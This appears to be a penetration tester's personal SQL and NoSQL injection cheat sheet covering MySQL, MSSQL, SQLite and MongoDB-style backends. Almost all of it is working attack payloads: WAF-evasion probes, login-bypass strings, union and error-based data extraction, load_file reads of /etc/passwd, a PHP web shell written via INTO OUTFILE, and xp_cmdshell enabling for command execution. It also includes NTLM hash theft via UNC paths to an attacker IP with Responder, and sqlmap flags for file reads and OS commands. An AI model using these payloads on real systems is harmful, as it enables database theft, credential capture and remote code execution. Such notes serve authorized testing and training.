– for probing I will be using ‘ or ‘) or “ or % or & or – - or ‘ – - or ‘)-- -

- if as result of my probing I get a different HTTP status e,g 500 Internal server error or  shorter content-length or error message, then this is an indicator of SQLi

-Once the vulnerability confirmed I will be trying to establish a  number of columns so  I will be 
 using Camel case notation for my “UnIOn SElEcT” to avoid filters
removing and sleep(0)
changing the probing character
removing the probing character
overflowing the integer e.g q=111111111111’

-If after establishing number of columns I cannot extract any information, try to


put some enormous value in the parameter (if number expected) e.g param=99999 union select 1,2,@@version,4,5,6…

concatenate with a string (if string expected) e.g param=simon UniON seLEcT 1,2,3,concat(‘<param_value>’,’:’,@@version)-- -
or just simply change the original value e.g the original value is simon so change it into
param=simo union select 1,2,3,@@version– -


- when dealing with websocket do NOT use + or %20 just a blank space


-remember to inject into custom made cookies


Put through SQLmap
- if I am launching sqlmap against  the application that has in the header 

“Content-Type: charset=utf-8”

This means I am dealing with unicode characters so  I need to specify the following flag

--tamper=charunicodeescape


-When I launch SQLmap against application protected by WAF I need to use the following flag 

--delay=2

- When I launch SQLmap against application that is vulnerable to user enumeration I need to use the following flag to help sqlmap

--string=”<enumeraion_message>”

- When I launch SQLmap to read file from the system I need to use the following flag

--file-read=”<file_to_read>”

- When I launch SQLmap to execute command on the underlying system I need  to use the following 

--os-cmd=”<cmd>”

-if I launch sqlmap against the application that uses “secure parameter” approach I need to specify the following flag

--eval=’import hashlib;h=haslib.md5((b”<secret_salt>” +<param>.encode()).hexdigest()’


Bypass login page 
Username=admin’ or 1=1-- -
Username=admin’ or *
Username=admin’-- -
Username=admin’ or ‘1
Username=admin=
Username=admin’=
Username=admin=’
username=admin’ || ‘1’== ‘1&password=pass123

Username[$ne]=simon&password[$ne]=pass123
change content type into application/json and then
{“username”:{“[$ne]”:”simon”},
“password”:{“[$ne]”:”soffg”}}
username=<valid_user>&password[<name_password_param>]=1
username=admin&password[password]=1





2nd order SQL injection (takes place on the registration page)

Create a malicious users to escalate privileges
Username=admin’ or 1=1-- -
Username=admin’-- -
Username=admin’=
Username=admin=
Username=admin’ or ‘1
Username=admin++++++++++++++++++++1    #multiple spaces
(and then on the login page Username=admin&password=pass123
#username without spaces)


create malicious user to Extract information from the database via union
Username=simon’) and sleep(0) union select null,null,…-- - (to establish number of columns)
#login to the application and if you see “SQL ERROR” then you know it’s vulnerable
Username=simon’) and sleep(0) union select schema_name,null,null from information_schema.schemata-- -






If a backend database is MySQL I can:

A) Extract information from the database

Via Union 



First of all I need to establish a number of columns 
Id=5’ and sleep(0) union select 1,2..--+-
After establishing the number of columns I can map the structure of the database – if application returns only 1 row   this maybe an indicator that I need to use “limit 1 + offset 0” or “limit 1,0” or “group_concat()”

Id=5’ and sleep(0) union select group_concat(schema_name),2,3,4 from information_schema.schemata--+-

Id=5’ and sleep(0) UnioN SelEcT schema_name,2,3,4 from information_schema.schemata limit 1 offset 0--+-  

(Now I have all of the databases)
Id=5’ and sleep(0) union select group_concat(table_name,”:”,column_name),2,3,4 from information_schema.columns where table_schema=’<interesting_db>’

(Now I have all tables and columns of the interesting database)

Id=5’ and sleep(0) union select username,password,2,3 from <interesting_db>.<interesting_table>
(If I am already in the <interesting_db> I put only the <interesting_table>)

Id=5’ and sleep(0) union select username,password,2,3 from <interesting_table>

If password is too long to be extracted then I do 

Id=5’ and sleep(0) union select username,substring(password,1,30),2,3 from <db>.<table>



Id=5’ and sleep(0) union select unsername,substring(password,30,60),2,3 from <db>.<table>



Via extractvalue
id=5’) and extractvalue(0x0a,@@version)--+-
id=5’) and extractvalue(0x0a,concat(0x0a,user()))--+-
Id=5’)+and+extractvalue(0x0a,concat(0x0a,(Select schema_name from information_schema.schemata)))--+-
                                 or
id=5+and+extractvalue(0x0a,@@version)--+-
#here I don’t need to know the amount of columns 


via  update (requires two parameters)

param=simon’,<name_second_parameter>=@@version where id=1– -

B) Extract information from the system

Via union 
#I need to know the number of columns
#if the underlying system is windows the path fo read PHP files will be usually starting from C:\xampp\htdocs\<path>
Id=5’ and sleep(0) union select 1,2...-- -
Id=5’ and sleep(0) union select load_file(‘/etc/passwd’),2,3-- -
Id=5’ and sleep(0) union select to_base64(load_file(‘/etc/passwd’)),2,3-- -
id=4’ and sleep(0) unION SeleCT 1,to_base64(load_file(‘C:/xampp/htdocs/<different_path>’),3–+-

Via nested SQLi
#I do NOT need to know the number of columns
Id=5’ and sleep(0) union select “5’ and sleep(0) union select ‘/etc/passwd’-- -”-- -

                                 

C) get a code execution by injection a malicious content via union ( requires: I need to know the current working directory and have writable permissions there and have writable permissions to the database)

#first I need to establish  number of columns
Id=4’ and sleep(0) union select 1,2...--+-
Id=4’ and sleep(0) union select (“<?php system($_GET[‘cmd’]);?>”),2,3 into outfile ‘/var/www/html/shell.php’--+-

d) Steal NTLM hash (windows only)

param=’ and sleep(0) unION Select 1,2,3,load_file(‘\\\\<attacker_ip>\\simon’),5;%00


If a backend database is NoSQL I can:

          -brute force  username and password (takes places on the login page)

Username[$regex]=<burp_intruder>&password[$ne]=pass123

And I will be brute forcing all characters for users
After that I will be brute forcing passwords but remember to escape special characters e.g \@
Username=<valid_user>&password[$regex]=<burp_intruder>

extract information

param=admin’ || ‘1’==’1




If a backend database is MSSQL I can

Extract information from the databases via union

#establish a number of columns, in MSSQL you MUST use 1,2,3 

q=500’ union select 1,2,3,4…

#after establish number of columns
#Extract database name

q=500’ union select 1,db_name(1),3,4,5,6–+-
#change number in the bracets to get next database

#now when we have db_name we can extract table names and their ID; ID is important because system can recognize db only via its ID (not a name like in MySQL)

q=500’ union select 1,string_agg(concat(name,’:’,id),’|’),3,4,5,6 from <db_name>..sysobjects where xtype=’u’--+-

#’U’ stands for user-defined
#name and id are hardcoded - this is how MSSQL works
#name is for you and ID is for the system to recognize the DB
#you need to use double dots 

#now with table name and the IDs we can get columns
q=500’ union select 1,string_agg(name,’|’),3,4,5,6 from <db_name>..syscolumns where id=<ID>--+-

#now we have columns so we can extract the actual data

q=500’ union select 1,string_agg(concat(username,’:’,password),’|’),3,4,5,6 from <db_name>..<table_name>--+-


Bruteforce RID (see appendix for the code, requires: box must be part of AD)

Python3 mssqli-duet.py -r ~/Desktop/res.txt -p “name” -i “ simon’ ” -rid 1000-1200 


#if I am launching a script against  the application that has in the server response header 

“Content-Type: charset=utf-8”

Then I need to specify the following flag

-e unicode 


#if the application is protected by WAF I need to specify the following flag 

-t 3 

steal the NTLM hash by abusing stacked queries
Id=5’;exec master.dbo.xp_dirtree ‘\\<my_ip>\simon’;-- -

(on my terminal)
Responder –I tun0 -vv

get code execution

   by xp_cmdshell
Id=5;exec sp_configure ‘show advanced options’, 1;exec sp_configure ‘Xp_CmDSheLl’, 1;RECONFIGURE;-- -

#it’s a good idea to sue camel case notation for xp_cmdshell
After enabling xp_cmdshell to execute it:

Id=5;exec xp_cmdshell “<cmd>”;-- -

   
                                             or


 by union
Id=5+union+select+1,2,3... # to Establish a number of columns 
#you must use 1,2,3 not null,null,null ...
Id=5;create table simon (ID int IDENTITY (1,1) PRIMARY KEY,output varchar(8000))   #nothing at the end
Id=5;insert into simon (output) exec Xp_CmDsHeLl ‘<cmd>’;-- -
Id=5 union select 1,2,(select top  1  output from simon where ID = <number_increment>)-- -
#you need to use 1,2,… NOT null,null.. Cuz it will not be working )

 If the backend database is SQLite I can

-brute force  username 
Param=a’ and case when ((Select count (<username>) from users where username like  ‘<burp_intruder>%’)>0) then 1 else  load_extension(0) end and ‘a’=’a

When I have a valid user I can brute force password 

Param=a’ and case when ((Select <password> from users where username=’<valid_username>’) like ‘<burp_instruder>%’) then 1 else load_extension(0) end and ‘a’=’a

If WhoIs server is enabled I can extract information from the WhoIs database
Nc  -v <victim_ip> 43
‘) union select null,null-- - #and the standard

                                    Or
‘) and extractvalue(0x0a,concat(0x0a,@@version))--+-  #and the standard

